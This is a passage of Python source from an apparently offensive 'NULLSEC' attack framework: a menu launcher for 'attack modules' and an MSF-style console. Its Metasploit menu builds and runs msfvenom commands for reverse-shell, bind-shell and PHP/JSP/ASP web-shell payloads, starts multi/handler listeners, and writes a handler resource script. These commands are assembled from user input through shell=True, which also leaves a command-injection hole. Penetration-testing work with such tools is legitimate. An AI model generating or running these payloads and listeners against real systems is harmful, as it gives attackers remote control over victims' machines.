def run_all_modules():
    print(f"\n{Colors.RED}[!] Executing ALL {len(MODULES)} attack modules...{Colors.RESET}")
    time.sleep(1)
    for mod in MODULES:
        run_module(mod)

def run_random_module():
    mod = random.choice(MODULES)
    print(f"\n{Colors.YELLOW}[*] Random target: {mod['icon']} {mod['name']}{Colors.RESET}")
    time.sleep(0.5)
    run_module(mod)

def category_filter():
    categories = sorted(list(set(mod['category'] for mod in MODULES)))
    
    clear_screen()
    print_banner()
    print(f"\n{Colors.CYAN}  SELECT CATEGORY:{Colors.RESET}\n")
    
    for i, cat in enumerate(categories, 1):
        count = sum(1 for m in MODULES if m['category'] == cat)
        print(f"    {Colors.RED}[{i:2d}]{Colors.RESET} {cat} ({count} modules)")
    
    print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back to main menu")
    
    choice = input(f"\n{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
    
    if choice == 'b':
        return
    
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(categories):
            selected_cat = categories[idx]
            filtered = [m for m in MODULES if m['category'] == selected_cat]
            
            clear_screen()
            print_banner()
            print(f"\n{Colors.CYAN}  {selected_cat.upper()} MODULES:{Colors.RESET}\n")
            
            for mod in filtered:
                print(f"    {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['icon']} {mod['name']}")
            
            print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back")
            
            sub_choice = input(f"\n{Colors.WHITE}  Enter module number: {Colors.RESET}").strip().lower()
            
            if sub_choice != 'b':
                try:
                    mod_id = int(sub_choice)
                    mod = next((m for m in MODULES if m['id'] == mod_id), None)
                    if mod:
                        run_module(mod)
                except ValueError:
                    pass
    except ValueError:
        pass

def search_modules():
    clear_screen()
    print_banner()
    query = input(f"\n{Colors.WHITE}  Search modules: {Colors.RESET}").strip().lower()
    
    if not query:
        return
    
    results = [m for m in MODULES if query in m['name'].lower() or query in m['desc'].lower() or query in m['category'].lower()]
    
    if not results:
        print(f"\n{Colors.RED}  No modules found matching '{query}'{Colors.RESET}")
        time.sleep(1.5)
        return
    
    print(f"\n{Colors.GREEN}  Found {len(results)} modules:{Colors.RESET}\n")
    
    for mod in results:
        print(f"    {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['icon']} {mod['name']} - {mod['desc']}")
    
    print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back")
    
    choice = input(f"\n{Colors.WHITE}  Enter module number: {Colors.RESET}").strip().lower()
    
    if choice != 'b':
        try:
            mod_id = int(choice)
            mod = next((m for m in MODULES if m['id'] == mod_id), None)
            if mod:
                run_module(mod)
        except ValueError:
            pass

def external_terminal_mode():
    clear_screen()
    print_banner()
    print(f"\n{Colors.CYAN}  LAUNCH IN EXTERNAL TERMINAL:{Colors.RESET}\n")
    
    for mod in MODULES[:20]:
        print(f"    {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['icon']} {mod['name']}")
    print(f"    {Colors.DIM}    ... and {len(MODULES) - 20} more (enter any number){Colors.RESET}")
    
    print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back")
    
    choice = input(f"\n{Colors.WHITE}  Enter module number: {Colors.RESET}").strip().lower()
    
    if choice == 'b':
        return
    
    try:
        mod_id = int(choice)
        mod = next((m for m in MODULES if m['id'] == mod_id), None)
        if mod:
            run_module(mod, external=True)
    except ValueError:
        pass

def msf_integration():
    """Launch Metasploit integration menu"""
    clear_screen()
    print_banner()
    print(f"""
{Colors.CYAN}  ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸{Colors.RESET}
{Colors.CYAN}  ▓{Colors.WHITE}  METASPLOIT FRAMEWORK INTEGRATION                                  {Colors.CYAN}▓{Colors.RESET}
{Colors.CYAN}  ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸{Colors.RESET}

    {Colors.RED}[1]{Colors.RESET} Launch Metasploit Console (msfconsole)
    {Colors.RED}[2]{Colors.RESET} Launch MSF Venom Payload Generator
    {Colors.RED}[3]{Colors.RESET} Launch MSF Database (msfdb)
    {Colors.RED}[4]{Colors.RESET} Search MSF Exploits
    {Colors.RED}[5]{Colors.RESET} Search MSF Auxiliary Modules
    {Colors.RED}[6]{Colors.RESET} Generate Reverse Shell (msfvenom)
    {Colors.RED}[7]{Colors.RESET} Generate Bind Shell (msfvenom)
    {Colors.RED}[8]{Colors.RESET} Generate Web Payload
    {Colors.RED}[9]{Colors.RESET} Multi Handler Setup
    {Colors.RED}[10]{Colors.RESET} Resource Script Generator

    {Colors.GREEN}[B]{Colors.RESET} Back to main menu

{Colors.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
""")
    
    choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip()
    
    if choice == 'b' or choice == 'B':
        return
    elif choice == '1':
        print(f"\n{Colors.GREEN}[*] Launching Metasploit Console...{Colors.RESET}")
        subprocess.run(['msfconsole'])
    elif choice == '2':
        print(f"\n{Colors.GREEN}[*] MSFVenom Payload Generator{Colors.RESET}")
        print(f"{Colors.CYAN}Example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe{Colors.RESET}")
        subprocess.run(['bash'])
    elif choice == '3':
        print(f"\n{Colors.GREEN}[*] MSF Database Management{Colors.RESET}")
        subprocess.run(['msfdb', 'status'])
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
    elif choice == '4':
        query = input(f"\n{Colors.WHITE}  Search exploits for: {Colors.RESET}")
        subprocess.run(['msfconsole', '-q', '-x', f'search {query}; exit'])
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
    elif choice == '5':
        query = input(f"\n{Colors.WHITE}  Search auxiliary for: {Colors.RESET}")
        subprocess.run(['msfconsole', '-q', '-x', f'search type:auxiliary {query}; exit'])
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
    elif choice == '6':
        print(f"\n{Colors.CYAN}Generating Reverse Shell...{Colors.RESET}")
        lhost = input(f"{Colors.WHITE}  LHOST (Your IP): {Colors.RESET}")
        lport = input(f"{Colors.WHITE}  LPORT: {Colors.RESET}") or "4444"
        platform = input(f"{Colors.WHITE}  Platform (windows/linux/osx): {Colors.RESET}") or "windows"
        output = input(f"{Colors.WHITE}  Output file: {Colors.RESET}") or "payload.exe"
        cmd = f"msfvenom -p {platform}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}"
        print(f"\n{Colors.GREEN}[*] Running: {cmd}{Colors.RESET}")
        subprocess.run(cmd, shell=True)
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
    elif choice == '7':
        print(f"\n{Colors.CYAN}Generating Bind Shell...{Colors.RESET}")
        lport = input(f"{Colors.WHITE}  LPORT: {Colors.RESET}") or "4444"
        platform = input(f"{Colors.WHITE}  Platform (windows/linux/osx): {Colors.RESET}") or "windows"
        output = input(f"{Colors.WHITE}  Output file: {Colors.RESET}") or "bind_payload.exe"
        cmd = f"msfvenom -p {platform}/meterpreter/bind_tcp LPORT={lport} -f exe -o {output}"
        print(f"\n{Colors.GREEN}[*] Running: {cmd}{Colors.RESET}")
        subprocess.run(cmd, shell=True)
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
    elif choice == '8':
        print(f"\n{Colors.CYAN}Generating Web Payload...{Colors.RESET}")
        lhost = input(f"{Colors.WHITE}  LHOST: {Colors.RESET}")
        lport = input(f"{Colors.WHITE}  LPORT: {Colors.RESET}") or "4444"
        payload_type = input(f"{Colors.WHITE}  Type (php/jsp/asp): {Colors.RESET}") or "php"
        output = input(f"{Colors.WHITE}  Output file: {Colors.RESET}") or f"shell.{payload_type}"
        cmd = f"msfvenom -p {payload_type}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {output}"
        print(f"\n{Colors.GREEN}[*] Running: {cmd}{Colors.RESET}")
        subprocess.run(cmd, shell=True)
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
    elif choice == '9':
        print(f"\n{Colors.CYAN}Multi Handler Setup{Colors.RESET}")
        lhost = input(f"{Colors.WHITE}  LHOST: {Colors.RESET}")
        lport = input(f"{Colors.WHITE}  LPORT: {Colors.RESET}") or "4444"
        payload = input(f"{Colors.WHITE}  Payload: {Colors.RESET}") or "windows/meterpreter/reverse_tcp"
        cmd = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit'"
        subprocess.run(cmd, shell=True)
    elif choice == '10':
        print(f"\n{Colors.CYAN}Resource Script Generator{Colors.RESET}")
        print(f"{Colors.DIM}Creating automated MSF resource script...{Colors.RESET}")
        script_content = """use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j -z
"""
        with open("/tmp/nullsec_handler.rc", "w") as f:
            f.write(script_content)
        print(f"{Colors.GREEN}[+] Created: /tmp/nullsec_handler.rc{Colors.RESET}")
        print(f"{Colors.CYAN}Run with: msfconsole -r /tmp/nullsec_handler.rc{Colors.RESET}")
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")

def framework_console():
    """Interactive NULLSEC Framework Console (MSF-style)"""
    clear_screen()
    print(f"""
{Colors.RED}
    ███▓   ██▓██▓   ██▓██▓     ██▓     ███████▓███████▓ ██████▓
    ████▓  ██████   ██████     ███     ██▓━━━━▓██▓━━━━▓██▓━━━━▓
    ██▓██▓ ██████   ██████     ███     ███████▓█████▓  ███     
    ███▓██▓██████   ██████     ███     ▓━━━━█████▓━━▓  ███     
    ███ ▓█████▓██████▓▓███████▓███████▓███████████████▓▓██████▓
    ▓━▓  ▓━━━▓ ▓━━━━━▓ ▓━━━━━━▓▓━━━━━━▓▓━━━━━━▓▓━━━━━━▓ ▓━━━━━▓
{Colors.RESET}
{Colors.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
{Colors.WHITE}                    NULLSEC FRAMEWORK CONSOLE{Colors.RESET}
{Colors.CYAN}                      Interactive Command Shell{Colors.RESET}
{Colors.DIM}                   Type 'help' for available commands{Colors.RESET}
{Colors.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
""")
    
    context = {"target": None, "module": None, "options": {}}
    
    while True:
        try:
            prompt = f"{Colors.RED}nullsec{Colors.RESET}"
            if context["module"]:
                prompt += f"{Colors.CYAN}({context['module']['name']}){Colors.RESET}"
            prompt += f" {Colors.WHITE}>{Colors.RESET} "
            
            cmd = input(prompt).strip().lower()
            
            if not cmd:
                continue
            elif cmd in ['exit', 'quit', 'q']:
                break
            elif cmd == 'help':
                print(f"""
{Colors.CYAN}Available Commands:{Colors.RESET}
  {Colors.YELLOW}use <id>{Colors.RESET}         - Select a module by ID
  {Colors.YELLOW}show modules{Colors.RESET}     - List all available modules  
  {Colors.YELLOW}show options{Colors.RESET}     - Show module options
  {Colors.YELLOW}set <opt> <val>{Colors.RESET}  - Set an option value
  {Colors.YELLOW}run{Colors.RESET}              - Execute the selected module
  {Colors.YELLOW}exploit{Colors.RESET}          - Alias for 'run'
  {Colors.YELLOW}back{Colors.RESET}             - Deselect current module
  {Colors.YELLOW}search <term>{Colors.RESET}    - Search for modules
  {Colors.YELLOW}info{Colors.RESET}             - Show module information
  {Colors.YELLOW}msfconsole{Colors.RESET}       - Launch Metasploit
  {Colors.YELLOW}clear{Colors.RESET}            - Clear screen
  {Colors.YELLOW}help{Colors.RESET}             - Show this help
  {Colors.YELLOW}exit{Colors.RESET}             - Exit framework console
""")
            elif cmd == 'show modules':
                print(f"\n{Colors.CYAN}NULLSEC Modules:{Colors.RESET}")
                for mod in MODULES[:20]:
                    print(f"  {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['icon']} {mod['name']} - {mod['desc']}")
                print(f"  {Colors.DIM}... and {len(MODULES) - 20} more{Colors.RESET}\n")
            elif cmd.startswith('use '):
                try:
                    mod_id = int(cmd.split()[1])
                    mod = next((m for m in MODULES if m['id'] == mod_id), None)
                    if mod:
                        context["module"] = mod
                        print(f"{Colors.GREEN}[+] Module selected: {mod['name']}{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[-] Module not found{Colors.RESET}")
                except (ValueError, IndexError):
                    print(f"{Colors.RED}[-] Invalid module ID{Colors.RESET}")
            elif cmd == 'show options':
                if context["module"]:
                    print(f"\n{Colors.CYAN}Module:{Colors.RESET} {context['module']['name']}")
                    print(f"{Colors.CYAN}Description:{Colors.RESET} {context['module']['desc']}")
                    print(f"{Colors.CYAN}Category:{Colors.RESET} {context['module']['category']}")
                    print(f"{Colors.CYAN}Script:{Colors.RESET} {context['module']['script']}\n")
                else:
                    print(f"{Colors.YELLOW}[*] No module selected. Use 'use <id>'{Colors.RESET}")
            elif cmd in ['run', 'exploit']:
                if context["module"]:
                    run_module(context["module"])
                else:
                    print(f"{Colors.YELLOW}[*] No module selected{Colors.RESET}")
            elif cmd == 'back':
                context["module"] = None
                print(f"{Colors.YELLOW}[*] Module deselected{Colors.RESET}")
            elif cmd.startswith('search '):
                query = cmd[7:].strip()
                results = [m for m in MODULES if query in m['name'].lower() or query in m['desc'].lower()]
                if results:
                    print(f"\n{Colors.GREEN}Found {len(results)} modules:{Colors.RESET}")
                    for mod in results[:10]:
                        print(f"  {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['name']} - {mod['desc']}")
                    if len(results) > 10:
                        print(f"  {Colors.DIM}... and {len(results) - 10} more{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[-] No matches found{Colors.RESET}")
            elif cmd == 'info':
                if context["module"]:
                    mod = context["module"]
                    print(f"""
{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
{Colors.WHITE}  Module Information{Colors.RESET}
{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
  {Colors.YELLOW}Name:{Colors.RESET}        {mod['name']}
  {Colors.YELLOW}Icon:{Colors.RESET}        {mod['icon']}
  {Colors.YELLOW}Category:{Colors.RESET}    {mod['category']}
  {Colors.YELLOW}Description:{Colors.RESET} {mod['desc']}
  {Colors.YELLOW}Script:{Colors.RESET}      {mod['script']}
  {Colors.YELLOW}ID:{Colors.RESET}          {mod['id']}
{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
""")
                else:
                    print(f"{Colors.YELLOW}[*] No module selected{Colors.RESET}")
            elif cmd == 'msfconsole':
                print(f"\n{Colors.GREEN}[*] Launching Metasploit Framework...{Colors.RESET}")
                subprocess.run(['msfconsole'])
            elif cmd == 'clear':
                clear_screen()
            else:
                print(f"{Colors.RED}[-] Unknown command. Type 'help' for available commands{Colors.RESET}")
        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Use 'exit' to quit{Colors.RESET}")
    
    print(f"{Colors.GREEN}[*] Exiting framework console{Colors.RESET}")
    time.sleep(0.5)

